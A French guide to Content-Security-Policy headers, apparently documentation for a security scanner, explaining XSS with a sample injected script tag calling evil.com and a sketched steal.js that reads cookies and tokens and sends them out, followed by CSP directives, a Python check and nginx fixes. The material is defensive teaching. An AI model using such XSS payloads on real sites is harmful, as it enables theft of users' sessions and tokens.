# Content-Security-Policy (CSP)

## En une phrase

La CSP est une liste blanche que le serveur envoie au navigateur :
"tu n'as le droit de charger des ressources QUE depuis ces sources
autorisées — tout le reste est bloqué."

---

## L'analogie

Imagine un agent de sécurité à l'entrée d'une fête privée avec une
liste d'invités. Sans liste (sans CSP), n'importe qui peut entrer et
faire n'importe quoi — un inconnu peut s'installer derrière le bar et
servir des boissons trafiquées. Avec la liste, seuls les invités
connus peuvent entrer, et chaque zone (bar, cuisine, scène) n'est
accessible qu'aux personnes autorisées pour ce rôle précis.

---

## L'attaque — Cross-Site Scripting (XSS)

Sans CSP, un attaquant qui trouve une faille d'injection peut faire
exécuter du JavaScript arbitraire dans le navigateur de tes utilisateurs.

```
SANS CSP
─────────────────────────────────────────────────────────────────

  Attaquant trouve un champ de commentaire non filtré :
  
  Commentaire posté : <script src="https://evil.com/steal.js"></script>
  
  Navigateur de la victime charge la page → exécute le script →
  
  steal.js :
  ┌─────────────────────────────────────────────────┐
  │  document.cookie         → vole les cookies     │
  │  localStorage.getItem()  → vole les tokens JWT  │
  │  fetch("evil.com", data) → exfiltre les données │
  └─────────────────────────────────────────────────┘
  
  L'attaquant reçoit les données sur evil.com.
  La victime ne voit rien.

AVEC CSP : default-src 'self'
─────────────────────────────────────────────────────────────────

  Navigateur reçoit le header :
  Content-Security-Policy: default-src 'self'
  
  Navigateur voit <script src="https://evil.com/steal.js">
  → evil.com n'est pas dans la liste blanche
  → BLOQUÉ — le script ne s'exécute jamais
  → Erreur dans la console : "Refused to load script"
```

---

## Anatomie d'une CSP complète

```
Content-Security-Policy:
  default-src 'self';
  │           │
  │           └── uniquement depuis ton propre domaine
  └── directive par défaut si aucune autre ne correspond

  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  │           │      │               │
  │           │      │               └── eval() autorisé (dangereux)
  │           │      └── JS inline autorisé (<script>...</script>)
  │           └── scripts depuis ton domaine
  └── règle pour les fichiers JavaScript

  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  │                │    │
  │                │    └── images depuis n'importe quel HTTPS
  │                └── images en base64 (data:image/png;base64,...)
  └── règle pour les images

  font-src 'self' data:;
  connect-src 'self' https:;   ← fetch(), XHR, WebSocket
  frame-ancestors 'none';      ← remplace X-Frame-Options: DENY
  base-uri 'self';             ← empêche injection de <base href>
  form-action 'self';          ← formulaires uniquement vers ton domaine
```

---

## Ce que le scanner détecte

**Check** : `HeadersCheck` — Phase 4

```python
csp = response.headers.get("Content-Security-Policy")

# Absent
if not csp:
    return {
        "result": "error",
        "message": "CSP absente — XSS non mitigé"
    }

# Présent mais dangereux
if "unsafe-inline" in csp and "unsafe-eval" in csp:
    return {
        "result": "warning",
        "message": "CSP présente mais unsafe-inline + unsafe-eval réduisent la protection"
    }

# Correct
return {
    "result": "ok",
    "value": csp
}
```

---

## La correction Nginx

```nginx
# CSP minimale sécurisée
add_header Content-Security-Policy
    "default-src 'self';
     script-src 'self';
     style-src 'self';
     img-src 'self' data: https:;
     font-src 'self';
     connect-src 'self';
     frame-ancestors 'none';
     base-uri 'self';
     form-action 'self';" always;

# Pour Angular (nécessite unsafe-inline car Angular compile du CSS inline)
add_header Content-Security-Policy
    "default-src 'self';
     script-src 'self' 'unsafe-inline' 'unsafe-eval';
     style-src 'self' 'unsafe-inline';
     img-src 'self' data: https:;
     font-src 'self' data:;
     connect-src 'self' https:;
     frame-ancestors 'none';
     base-uri 'self';
     form-action 'self';" always;
```

---

## Avant / Après

```
AVANT
$ curl -I https://monsite.fr | grep -i content-security
(rien) ← XSS possible, scripts externes chargés librement

APRÈS
$ curl -I https://monsite.fr | grep -i content-security
content-security-policy: default-src 'self'; script-src 'self'...
← scripts externes bloqués par le navigateur
```

---

## Références officielles

- **MDN Web Docs** — [Content-Security-Policy](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Content-Security-Policy)
- **OWASP** — [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- **W3C** — [CSP Level 3 Specification](https://www.w3.org/TR/CSP3/)
- **CWE-79** — Cross-site Scripting (XSS)
- **OWASP Top 10 A03:2021** — Injection